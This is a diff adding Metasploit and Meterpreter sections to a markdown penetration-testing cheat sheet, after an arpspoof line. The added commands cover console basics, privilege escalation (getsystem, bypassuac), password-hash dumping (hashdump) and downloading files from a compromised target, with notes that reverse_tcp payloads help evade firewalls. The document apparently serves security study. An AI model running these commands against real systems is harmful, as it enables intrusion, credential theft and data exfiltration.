@@ -74,3 +74,36 @@ The above command does all the previous ones and gives you more data too except 
 arpspoof -i <interface> -t target -r host
 ```
 
+## Metasploit
+
+### Basic
+
+```text
+search <term>
+use <term>
+info
+show options
+set <option> x
+exploit
+```
+
+### Meterpreter
+
+**bind\_tcp**: runs a server process on the target machine that waits for connections from attacker machine.
+
+**reverse\_tcp**: performs a TCP connection back to the attacker machine. Helps evade firewall rules.
+
+```text
+background #backgrounds the current session
+sessions -l
+sessions -i %n
+sysinfo
+ifconfig, route
+getuid
+getsystem #privesc
+bypassuac #if privesc fails
+hashdump
+cat '/path/to/file.txt'
+download '/path/to/fileontarget.txt' /root/mymachine/
+```
+
